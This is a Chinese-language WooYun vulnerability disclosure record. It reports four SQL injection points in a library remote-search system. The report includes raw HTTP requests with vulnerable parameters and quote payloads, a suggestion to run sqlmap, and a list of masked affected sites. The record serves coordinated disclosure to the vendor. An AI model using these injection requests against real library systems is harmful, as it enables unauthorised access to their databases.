{"id": 83616, "wybug_id": "wooyun-2015-0147291", "wybug_title": "某图书远程检索系统四处SQL注射漏洞打包", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-18 17:23", "wybug_open_date": "2016-01-20 15:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向公众公开  简要描述： 隐蔽的注入点 详细说明：  \n观http://**.**.**.**/bugs/wooyun-2010-086973有感而发\n\n注入点文件：GetRegistInfoAjax.aspx\n打开http://**.**.**.**/NTRdrS_RegistInfo.aspx?BookRecno=900021568\n\nPOST包如下\n..T /GetRegistInfoAjax.aspx?nbibRecno=900021568&nRecno=732140&Year=2015 HTTP/1.1Accept: */*Referer: http://**.**.**.**/NTRdrS_RegistInfo.aspx?BookRecno=900021568Accept-Language: zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: **.**.**.**Connection: Keep-Alive\n构造一下地址,也可以sqlmap直接跑,构造的地址为：http://**.**.**.**/GetRegistInfoAjax.aspx?nbibRecno=900021568&nRecno=732140&Year=2015\n\n\n\n在来演示一个：http://**.**.**.**:8081/NTRdrS_RegistInfo.aspx?BookRecno=900000848方法如上 不多说了\nGET /GetRegistInfoAjax.aspx?nbibRecno=900000848&nRecno=261022&Year=2015 HTTP/1.1Accept: */*Referer: http://**.**.**.**:8081/NTRdrS_RegistInfo.aspx?BookRecno=900000848Accept-Language: zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: **.**.**.**:8081Connection: Keep-Alive\n构造地址：http://**.**.**.**:8081/GetRegistInfoAjax.aspx?nbibRecno=900000848&nRecno=261022&Year=2015\n\n\n\n最后提供一下案例：\nhttp://**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/http://**.**.**.**:8081/**.**.**.**/http://**.**.**.**/http://**.**.**.**/**.**.**.**/**.**.**.**:1000/**.**.**.**/**.**.**.**:88/\n提供几个供审核参考的案例\n**.**.**.**/NTRdrS_RegistInfo.aspx?BookRecno=900004601**.**.**.**/NTRdrS_RegistInfo.aspx?BookRecno=900008028http://**.**.**.**/NTRdrS_RegistInfo.aspx?BookRecno=900000021http://**.**.**.**:8081/NTRdrS_RegistInfo.aspx?BookRecno=900001058http://**.**.**.**:90/NTRdrS_RegistInfo.aspx?BookRecno=900000336\n   漏洞证明：  0x02第二处注入点位于：autodbtj/modifyzdjb.jsp**.**.**.**:8070/autodbtj/modifyzdjb.jsp做演示\nPOST /autodbtj/modifyzdjb.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**:8070/autodbtj/modifyzdjb.jspAccept-Language: zh-CNContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept-Encoding: gzip, deflateHost: **.**.**.**:8070Content-Length: 15Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=abc9f-Y6iBRMj85zEfXbvzwkm=1&bz=1&id=\nzwkm参数存在注入\n\n0x03http://**.**.**.**:8070/**.**.**.**:8070/**.**.**.**:8070/**.**.**.**:8089/http://**.**.**.**:88/http://**.**.**.**:8070/**.**.**.**:8070/**.**.**.**:8070/**.**.**.**:8070/**.**.**.**:8070/http://**.**.**.**:8089/**.**.**.**:8086/http://**.**.**.**:8089/**.**.**.**:8089/**.**.**.**:8088/引爆点位于文件：ggjs/zdzx/dztj.jsp**.**.**.**:8070/ggjs/zdzx/dztj.jsp做演示\nPOST /ggjs/zdzx/dztjjg.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**:8070/ggjs/zdzx/dztj.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8070Content-Length: 55Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=abc9f-Y6iBRMj85zEfXbvsmxx=null&isbn=&dztm=%27&dzmm=%27&Submit1=%CD%C6+%BC%F6\n\n\n0x04位于文件：xk/zdframe.jsp**.**.**.**:8089/xk/zdframe.jsp演示\nPOST /xk/zdjs.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**:8089/xk/zdsearch.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8089Content-Length: 56Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=abcCW7ela35Xo-svJqSbvmarc=U&year1=2014&year2=2015&path=km&jsc=%A1%AE&button1=\n盲注 不过多证明了\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-22 14:51 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-01 10:41 |    \t\tterm \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:33        )\t\t \n  合并的真好，妈的，两个不同的系统都合并到一起了，我看上你那4rank还是怎么的？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}